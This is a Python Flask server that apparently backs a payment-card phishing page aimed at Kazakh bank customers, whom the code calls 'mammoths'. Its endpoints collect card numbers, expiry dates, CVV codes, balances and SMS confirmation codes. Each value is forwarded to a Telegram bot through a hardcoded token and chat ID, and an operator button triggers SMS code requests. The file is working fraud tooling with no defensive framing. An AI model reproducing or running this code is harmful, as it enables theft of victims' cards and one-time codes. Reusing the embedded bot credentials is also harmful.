from flask import Flask, render_template, request, jsonify
import requests
import time
import threading
from datetime import datetime, timedelta

app = Flask(__name__)

TELEGRAM_TOKEN = "7684400766:AAEeKCGYR2EQ9AZTtZf5etcntenWxckYz4E"
CHAT_ID = "6497382050"
BIN_BLOCK_LIST = {
    '440043', '516949', '517949', '437302', '537040',
    '415887', '432451', '446393', '486575', '423427',
    '623357', '624495'
}
BIN_API_URL = "https://lookup.binlist.net/"

pending_transactions = {}
online_users = {}
last_update_id = 0

def get_bank_name(bin):
    try:
        response = requests.get(f"{BIN_API_URL}{bin}", headers={"Accept-Version": "3"})
        return response.json().get('bank', {}).get('name', 'Неизвестный банк') if response.status_code == 200 else 'Неизвестный банк'
    except:
        return 'Ошибка проверки BIN'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit_card', methods=['POST'])
def submit_card():
    data = request.json
    card_number = data['number'].replace(' ', '')
    bin = card_number[:6]

    if bin in BIN_BLOCK_LIST:
        return jsonify({"error": "⛔ Каспи Банк временно не поддерживается!"}), 400

    bank_name = get_bank_name(bin)
    transaction_id = int(time.time())
    mammoth_id = data.get('mammothId', 'unknown')

    pending_transactions[transaction_id] = {
        "card": data,
        "balance": None,
        "code": None,
        "sms_requested": False,
        "mammoth_id": mammoth_id,
        "bank": bank_name
    }

    online_users[mammoth_id] = datetime.now()

    message = f"""🦣 Мамонт ID: #{mammoth_id}
💳 Новая карта:
├ Номер: {data['number']}
├ Срок: {data['month']}/{data['year']}
├ CVV: {data['cvv']}
└ Банк: {bank_name} ({bin})"""

    requests.post(
        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
        json={
            "chat_id": CHAT_ID,
            "text": message,
            "reply_markup": {
                "inline_keyboard": [[
                    {"text": "📲 Отправить SMS", "callback_data": f"send_code_{transaction_id}"},
                    {"text": "🌐 Онлайн статус", "callback_data": f"check_online_{mammoth_id}"}
                ]]
            }
        }
    )

    return jsonify({"transaction_id": transaction_id})

@app.route('/submit_balance', methods=['POST'])
def submit_balance():
    data = request.json
    transaction = pending_transactions.get(data["transaction_id"])
    
    if transaction:
        transaction["balance"] = data["balance"]
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": f"💰 Баланс: {data['balance']} ₸"}
        )
        return jsonify({"status": "success"})
    return jsonify({"status": "invalid"}), 400

@app.route('/check_status')
def check_status():
    transaction_id = int(request.args.get('transaction_id'))
    transaction = pending_transactions.get(transaction_id)
    
    if not transaction:
        return jsonify({"status": "invalid"}), 400
    
    return jsonify({
        "balance_status": "completed" if transaction["balance"] else "pending",
        "sms_status": "code_sent" if transaction["sms_requested"] else "pending"
    })

@app.route('/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    transaction = pending_transactions.get(data["transaction_id"])

    if transaction:
        transaction["code"] = data["code"]
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": f"🔢 Код подтверждения: {data['code']}"}
        )
        return jsonify({"status": "success"})
    return jsonify({"status": "invalid"}), 400

def check_telegram_updates():
    global last_update_id
    while True:
        try:
            response = requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates", params={"offset": last_update_id + 1})
            for update in response.json().get("result", []):
                last_update_id = update["update_id"]
                if "callback_query" in update:
                    callback = update['callback_query']
                    data = callback['data']
                    
                    if data.startswith("send_code_"):
                        transaction_id = int(data.replace("send_code_", ""))
                        if transaction_id in pending_transactions:
                            pending_transactions[transaction_id]["sms_requested"] = True
                            requests.post(
                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
                                json={"callback_query_id": callback['id'], "text": "SMS запрошено ✅"}
                            )

            time.sleep(2)
        except Exception as e:
            print(f"Ошибка: {e}")

threading.Thread(target=check_telegram_updates, daemon=True).start()

if __name__ == '__main__':
    app.run(port=5000, debug=True)